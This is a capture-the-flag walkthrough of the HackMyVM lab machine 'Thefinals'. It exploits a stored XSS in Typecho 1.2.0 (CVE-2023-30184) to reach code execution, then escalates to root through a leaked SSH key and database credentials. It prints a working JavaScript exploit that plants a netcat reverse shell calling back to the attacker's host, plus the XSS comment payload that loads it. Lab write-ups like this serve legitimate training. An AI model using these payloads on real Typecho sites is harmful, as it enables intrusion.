# Thefinals

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Thefinals | 20206675 | Beginner | HackMyVM |

**Summary:** Thefinals is a beginner-level Alpine Linux machine running a vulnerable Typecho 1.2.0 CMS. The exploitation path involves leveraging a stored Cross-Site Scripting (XSS) vulnerability (CVE-2023-30184) to achieve Remote Code Execution by injecting malicious PHP code into the theme editor. Initial access is gained as the `apache` user through a reverse shell. Privilege escalation involves discovering a UDP broadcast service leaking a base64-encoded SSH private key for the `scotty` user. Further enumeration reveals a restricted script at `/sbin/secret` that only executes on TTY 99, which is accessed by spawning 98 pseudo-terminals. This script exposes MariaDB root credentials, leading to discovery of the system root password stored in a database table, ultimately granting full root access.

---

## Reconnaissance

### Network Discovery

The initial phase began with a network scan to identify the target machine within the local subnet:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.108 08:00:27:41:79:F7 VirtualBox
```

The scan identified the target at **192.168.100.108** with a VirtualBox MAC address, confirming it as our virtual machine target.

### Port Scanning

With the target identified, a comprehensive Nmap scan was performed to enumerate open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ nmap -sC -sV -p- -T4 192.168.100.108
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-13 17:58 WIB
Nmap scan report for 192.168.100.108
Host is up (0.0029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey:
|   256 42:a7:04:bb:da:b5:8e:71:7a:89:ff:a4:60:cd:4d:29 (ECDSA)
|_  256 37:32:71:ca:3f:11:41:b4:d7:90:1e:c9:7f:e8:bc:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Unix))
|_http-title: THE FINALS
|_http-server-header: Apache/2.4.62 (Unix)
| http-methods:
|_  Potentially risky methods: TRACE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
```

**Key Findings:**
- **Port 22 (SSH):** OpenSSH 9.9 - secured, no immediate vulnerabilities
- **Port 80 (HTTP):** Apache 2.4.62 (Unix) - web application attack surface
- **HTTP Methods:** TRACE method enabled (potentially risky but not directly exploitable)

### Web Application Enumeration

Accessing the web server on port 80 revealed a themed landing page:

![](image.png)

The page displayed "THE FINALS" game arenas with various locations (Monaco, Seoul, Skyway Stadium, Las Vegas, SYS$HORIZON, Kyoto, Fortune Stadium, Bernal). At the bottom of the page, a domain name was discovered: **THEFINALS.hmv**

This domain was added to the local hosts file for proper resolution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ echo '192.168.100.108 THEFINALS.hmv' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.108 THEFINALS.hmv

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ grep 192.168.100.108 /etc/hosts
192.168.100.108 THEFINALS.hmv

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ curl -I http://THEFINALS.hmv
HTTP/1.1 200 OK
Date: Fri, 13 Feb 2026 11:04:31 GMT
Server: Apache/2.4.62 (Unix)
Last-Modified: Thu, 03 Apr 2025 05:11:00 GMT
ETag: "3bb0-631d8cbbaccd1"
Accept-Ranges: bytes
Content-Length: 15280
Content-Type: text/html
```

### Directory Enumeration

To discover hidden directories and files, Gobuster was utilized with a common wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ gobuster dir -u http://THEFINALS.hmv/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://THEFINALS.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/blog                 (Status: 301) [Size: 311] [--> http://thefinals.hmv/blog/]
/css                  (Status: 301) [Size: 310] [--> http://thefinals.hmv/css/]
/fonts                (Status: 301) [Size: 312] [--> http://thefinals.hmv/fonts/]
/images               (Status: 301) [Size: 313] [--> http://thefinals.hmv/images/]
/index.html           (Status: 200) [Size: 15280]
/js                   (Status: 301) [Size: 309] [--> http://thefinals.hmv/js/]
/screenshots          (Status: 301) [Size: 318] [--> http://thefinals.hmv/screenshots/]
/server-status        (Status: 403) [Size: 276]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

The most interesting discovery was the **/blog/** directory, indicating a blog application is running.

---

## Vulnerability Discovery

### Typecho CMS Identification

Navigating to `http://thefinals.hmv/blog/` revealed a blog titled "THE FINALS Update Tracker" with the tagline "Only for professional players":

![](image-1.png)

The blog contained posts including "We'd like hearing your voice" with a notable message: "*Never hackers like CNS*" - foreshadowing for later stages. There was also a post titled "SEASON 6: RISING STARS" discussing game content updates.

Examining the page source code revealed critical version information:

![](image-3.png)

The HTML meta tag showed:
```html
<meta name="generator" content="Typecho 1.2.0" />
```

**Typecho version 1.2.0** was identified, which is vulnerable to CVE-2023-30184.

### CVE-2023-30184 Analysis

The blog also exposed an administrative login page at `http://thefinals.hmv/blog/admin/`:

![](image-2.png)

Research into Typecho 1.2.0 vulnerabilities led to the discovery of **CVE-2023-30184**, a Stored Cross-Site Scripting (XSS) to Remote Code Execution vulnerability.

**Vulnerability Details:**
- **CVE:** CVE-2023-30184
- **Type:** Stored XSS → RCE
- **Attack Vector:** Comment injection leading to theme editor modification
- **References:**
  - https://github.com/typecho/typecho/issues/1546
  - https://github.com/typecho/typecho/issues/1545
  - https://nvd.nist.gov/vuln/detail/CVE-2023-30184

**Attack Mechanism:**
The vulnerability allows an attacker to inject malicious JavaScript via blog comments. When an administrator views the comment, the JavaScript executes in their session, enabling automatic modification of theme files (specifically `404.php`) to include PHP reverse shell code.

---

## Initial Access

### Exploitation Strategy

Based on research from multiple Chinese security blogs and proof-of-concept exploits, a custom JavaScript payload was crafted to:

1. Automatically load when the admin views comments
2. Access the theme editor (`theme-editor.php`)
3. Inject PHP reverse shell code into `404.php`
4. Auto-save the modified file

### Exploit Development

The following JavaScript exploit was created (`exp.js`):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ cat exp.js
function oubaDirectPwn() {
    const path = window.location.pathname;
    let targetUrl = path.includes("manage-comments.php")
        ? path.replace('manage-comments.php', 'theme-editor.php?theme=default&file=404.php')
        : '/blog/admin/theme-editor.php?theme=default&file=404.php';

    const ifrAttr = "<iframe id='ouba_frame' src='" + targetUrl + "' width='0' height='0' style='display:none'></iframe>";
    document.body.innerHTML += ifrAttr;

    const ifr = document.getElementById('ouba_frame');
    let done = false;

    ifr.onload = function() {
        if (!done) {
            try {
                const frameDoc = ifr.contentWindow.document;
                const area = frameDoc.getElementById('content');
                const btns = frameDoc.getElementsByTagName('button');

                if (area && btns.length > 1) {
                    const revShell = "<?php proc_close(proc_open('nohup rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.1 4444 >/tmp/f &', array(), $foo)); ?>\n";
                    area.value = revShell + area.value;

                    btns[1].click();
                    done = true;
                }
            } catch (e) {}
        }
    };
}
oubaDirectPwn();
```

**Payload Breakdown:**
- Creates an invisible iframe pointing to the theme editor
- Injects a PHP reverse shell using `proc_open` and named pipes (FIFO)
- Automatically clicks the save button
- Connects back to 192.168.100.1:4444

### Payload Delivery

First, an HTTP server was set up to host the malicious JavaScript:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Next, navigating to `http://thefinals.hmv/blog/index.php/archives/1/` (the blog post with comments enabled), the following XSS payload was submitted in a comment:

```
http://x.x.com/"></a><script/src="http://192.168.100.1:8080/exp.js"></script><a/href="#
```

![](image-4.png)

The payload was entered in the "Website" field, with minimal content ("X") in the comment body. When submitted:

```bash
172.21.32.1 - - [14/Feb/2026 09:09:08] "GET /exp.js HTTP/1.1" 200 -
```

The HTTP server confirmed the JavaScript file was successfully fetched, indicating the XSS payload executed when the administrator (likely an automated process) viewed the comment.

### Reverse Shell Establishment

A Netcat listener was prepared to catch the incoming reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

To trigger the reverse shell, the modified `404.php` file was accessed directly:

```
http://thefinals.hmv/blog/usr/themes/default/404.php
```

![](image-5.png)

The browser displayed a blank white page (expected behavior as the PHP executes the shell), and the listener received a connection:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59910
/bin/sh: can't access tty; job control turned off
/var/www/html/blog/usr/themes/default $ id
uid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)
```

**Initial Access Achieved** as the `apache` user!

### Shell Stabilization

The basic shell was upgraded to a fully interactive TTY:

```bash
/var/www/html/blog/usr/themes/default $ which python3
/usr/bin/python3
/var/www/html/blog/usr/themes/default $ python3 -c 'import pty; pty.spawn("/bin/ash")'
/var/www/html/blog/usr/themes/default $ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

/var/www/html/blog/usr/themes/default $ export SHELL=ash
/var/www/html/blog/usr/themes/default $ export TERM=xterm
/var/www/html/blog/usr/themes/default $ stty rows 75 cols 200
/var/www/html/blog/usr/themes/default $ reset
```

This provided a fully functional shell with proper terminal emulation. The attack vector was a **Stored XSS to Remote Code Execution (XSS2RCE)** exploit.

---

## Privilege Escalation

### System Enumeration

With shell access as `apache`, enumeration of the system began:

```bash
/var/www/html/blog/usr/themes/default $ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/sh
june:x:1001:100::/home/june:/bin/ash
scotty:x:1002:100::/home/scotty:/bin/ash
staff:x:1000:100::/home/staff:/bin/ash
/var/www/html/blog/usr/themes/default $ uname -a
Linux thefinals.hmv 6.12.21-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2025-04-01 11:09:17 x86_64 Linux
```

**Key Findings:**
- **OS:** Alpine Linux (kernel 6.12.21-0-lts)
- **Users with shells:** root, june, scotty, staff

### Home Directory Reconnaissance

```bash
/var/www/html/blog $ ls -la /home
total 20
drwxr-xr-x    5 root     root          4096 Apr  3  2025 .
drwxr-xr-x   22 root     root          4096 Apr  3  2025 ..
drwxr-sr-x    2 june     users         4096 Apr  3  2025 june
drwx------    4 scotty   users         4096 Apr 23  2025 scotty
drwx------    4 staff    users         4096 Apr  3  2025 staff
/var/www/html/blog $ ls -la /home/june
total 16
drwxr-sr-x    2 june     users         4096 Apr  3  2025 .
drwxr-xr-x    5 root     root          4096 Apr  3  2025 ..
lrwxrwxrwx    1 root     users            9 Apr  3  2025 .ash_history -> /dev/null
-rw-r--r--    1 june     users          183 Apr 15  2025 message.txt
-rw-r--r--    1 june     users         3421 Apr  3  2025 user.flag
/var/www/html/blog $ cat /home/june/message.txt
Contestants, gear up and get ready! Who's got the KEY? Who's got the the guts?
                                                              --- This BROADCAST has been hacked by CNS
```

The message in `/home/june/message.txt` mentioned "Who's got the KEY?" and referenced a "BROADCAST" by "CNS" (matching the earlier blog post mention of "Never hackers like CNS"). This hinted at a broadcast service or communication mechanism.

### Process Discovery

Searching for processes owned by the `scotty` user:

```bash
/var/www/html/blog $ find / -user scotty 2>/dev/null
/proc/2532
...
/var/log/scotty-main.err
/var/log/scotty-main.log
```

Process 2532 belonged to scotty. Examining its command line:

```bash
/var/www/html/blog $ cat /proc/2532/cmdline | tr '\0' ' '
/usr/bin/python3 /home/scotty/cns_boardcast/main.py
```

A Python script named `main.py` in `/home/scotty/cns_boardcast/` was running. Checking the log file:

```bash
/var/www/html/blog $ cat /var/log/scotty-main.log
...
Broadcast to eth0 192.168.11.255:1337
Broadcast to eth0 192.168.11.255:1337
Broadcast to eth0 192.168.100.110:1337
Broadcast to eth0 192.168.100.110:1337
...
```

The service was broadcasting UDP packets to port **1337**. This aligned with the "BROADCAST" hint from june's message.

### Capturing the Broadcast

A UDP listener was established on port 1337 to capture the broadcast:

```bash
/var/www/html/blog $ nc -ulvp 1337
listening on [::]:1337 ...
connect to [::ffff:192.168.100.110]:1337 from [::ffff:192.168.100.110]:40595 ([::ffff:192.168.100.110]:40595)
[REDACTED]VEUgS0VZLS0tLS0K
```

The broadcast contained a base64-encoded string ending in `VEUgS0VZLS0tLS0K`.

### SSH Key Extraction

Decoding the base64 string on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ echo '[REDACTED]VEUgS0VZLS0tLS0K' | base64 -d
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
................................[REDACTED]............................
fEDXrKYpJtfZRjfbH8ATAAAAEnJvb3RAdGhlZmluYWxzLmhtdgECAw==
-----END OPENSSH PRIVATE KEY-----

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ echo '[REDACTED]VEUgS0VZLS0tLS0K' | base64 -d > id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ ssh-keygen -y -f id_rsa
ssh-ed25519 AAAAC3[REDACTED]fbH8AT root@thefinals.hmv
```

The decoded content was an **OpenSSH private key** for `root@thefinals.hmv`. However, attempting to use it for root login would likely fail. Given the context (scotty's process), this key was intended for the `scotty` user.

### Lateral Movement to Scotty

Using the discovered SSH key to authenticate as scotty:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thefinals]
└─$ ssh -i id_rsa scotty@192.168.100.110

thefinals:~$ id
uid=1002(scotty) gid=100(users) groups=100(users),100(users)
thefinals:~$ ls -la
total 16
drwx------    4 scotty   users         4096 Apr 23  2025 .
drwxr-xr-x    5 root     root          4096 Apr  3  2025 ..
lrwxrwxrwx    1 root     root             9 Apr  3  2025 .ash_history -> /dev/null
-rw-------    1 scotty   users            0 Apr 23  2025 .mariadb_history
drwx------    2 scotty   users         4096 Apr  3  2025 .ssh
drwx------    2 scotty   users         4096 Apr  3  2025 cns_boardcast
```

**Successfully pivoted to scotty user** via SSH key authentication.

### Escalation to Root

#### SUID and Privileged File Enumeration

```bash
thefinals:~$ which sudo
/usr/bin/sudo
thefinals:~$ file /sbin/secret
/sbin/secret: executable, regular file, no read permission
thefinals:~$ ls -la /sbin/secret
-rwx-----x    1 root     root            51 Apr 23  2025 /sbin/secret
```

A suspicious file `/sbin/secret` was found with execute-only permissions. Attempting to run it with sudo:

```bash
thefinals:~$ sudo /sbin/secret
/sbin/secret: line 2: can't create /dev/pts/99: Permission denied
```

The script failed because it required TTY **99** (`/dev/pts/99`), but the current session was on a different pseudo-terminal.

SUID binary enumeration:

```bash
thefinals:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x    1 root     root        230456 Mar 24  2025 /usr/lib/chromium/chrome-sandbox
-rwsr-xr-x    1 root     root         14224 Jul 18  2024 /usr/sbin/suexec
-rwsr-xr-x    1 root     root        199632 Dec  2  2024 /usr/bin/sudo
-rwsr-xr-x    1 root     root         67680 Oct  3  2024 /usr/bin/gpasswd
-rwsr-xr-x    1 root     root         40272 Oct  3  2024 /usr/bin/chsh
-rwsr-xr-x    1 root     root         26824 Oct  3  2024 /usr/bin/expiry
-rwsr-xr-x    1 root     root         88968 Oct  3  2024 /usr/bin/passwd
-rwsr-xr-x    1 root     root         88744 Oct  3  2024 /usr/bin/chage
-rwsr-xr-x    1 root     root         50032 Oct  3  2024 /usr/bin/chfn
---s--x--x    1 root     root         14224 Jan 18  2025 /bin/bbsuid
```

No immediately exploitable SUID binaries were found. The focus returned to the `/sbin/secret` script.

#### TTY 99 Manipulation

Checking the current TTY:

```bash
thefinals:~$ tty
/dev/pts/0
thefinals:~$ ls -la /dev/pts
total 0
drwxr-xr-x    2 root     root             0 Feb 14 12:08 .
drwxr-xr-x   14 root     root          2840 Feb 14 12:09 ..
crw--w----    1 scotty   tty       136,   0 Feb 14 12:49 0
c---------    1 root     root        5,   2 Feb 14 12:08 ptmx
```

Currently on `/dev/pts/0`. To reach `/dev/pts/99`, **98 additional pseudo-terminals** needed to be spawned. This was accomplished with a loop:

```bash
thefinals:~$ for i in $(seq 1 98); do python3 -c 'import pty; pty.spawn("/bin/sh")' & done; sleep 1; python3 -c 'import pty; pty.spawn("/bin/sh")'
~ $ tty
/dev/pts/99
```

Now on TTY 99! Running the secret script:

```bash
~ $ sudo /sbin/secret
root:p8R[REDACTED]
```

The script output credentials in the format `root:p8R[REDACTED]`.

#### Cleanup and Analysis

After obtaining the output, the spawned Python processes were terminated:

```bash
~ $ pkill -9 python3
thefinals:~$ jobs
thefinals:~$ reset
thefinals:~$ tty
/dev/pts/0
```

The session returned to TTY 0. The revealed password appeared to be for a database or service, not the system root account directly (attempting `su - root` with this password failed).

#### MariaDB Database Access

Given scotty's `.mariadb_history` file, the password was tested against MariaDB:

```bash
thefinals:~$ mysql -u root -p'p8R[REDACTED]'
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 200
Server version: 11.4.5-MariaDB Alpine Linux

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| secret             |
| sys                |
| test               |
| typecho_db         |
+--------------------+
7 rows in set (0.001 sec)
```

Successfully authenticated to MariaDB as root! A database named **`secret`** was discovered.

```bash
MariaDB [(none)]> use secret;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [secret]> show tables;
+------------------+
| Tables_in_secret |
+------------------+
| user             |
+------------------+
1 row in set (0.001 sec)

MariaDB [secret]> select * from user;
+----+----------+-------------------------+
| id | username | password                |
+----+----------+-------------------------+
|  1 | root     | BvI[REDACTED]           |
+----+----------+-------------------------+
1 row in set (0.008 sec)

MariaDB [secret]> exit
Bye
```

The `secret.user` table contained a row with username `root` and a password hash/plaintext password.

### Root Access

Using the discovered credentials to switch to root:

```bash
thefinals:~$ su - root
Password:
thefinals:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
thefinals:~# whoami
root
thefinals:~# hostname
thefinals.hmv
```

**Root access achieved!**

### Flag Capture

```bash
thefinals:~# cat /home/june/user.flag /root/root.flag
...
flag{4b5[REDACTED]}
...
flag{8c5[REDACTED]}
```

Both **user flag** and **root flag** successfully captured!

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scan identifying target at 192.168.100.108, followed by Nmap scan revealing SSH (22) and HTTP (80) services. Web enumeration discovered domain `THEFINALS.hmv` and `/blog/` directory.

2. **Vulnerability Discovery**: Identified Typecho CMS version 1.2.0 via HTML source code meta tags. Researched and confirmed the presence of CVE-2023-30184 (Stored XSS to RCE vulnerability).

3. **Exploitation**: Crafted malicious JavaScript payload (`exp.js`) containing PHP reverse shell code. Delivered payload via XSS in blog comment system, triggering automatic injection into theme file `404.php`. Accessed modified 404.php to execute reverse shell, gaining access as `apache` user.

4. **Internal Enumeration**: Stabilized shell and enumerated system (Alpine Linux). Discovered user `scotty` running Python broadcast service (`main.py`) on UDP port 1337. Captured UDP broadcast containing base64-encoded OpenSSH private key.

5. **Lateral Movement**: Decoded SSH private key and authenticated as `scotty` user via SSH. Discovered privileged script `/sbin/secret` requiring execution on TTY 99.

6. **Privilege Escalation**: Spawned 98 pseudo-terminals to reach `/dev/pts/99`, executed `/sbin/secret` revealing MariaDB root credentials. Authenticated to MariaDB database, queried `secret.user` table extracting system root password. Used credentials to escalate to root via `su`, capturing both user and root flags.

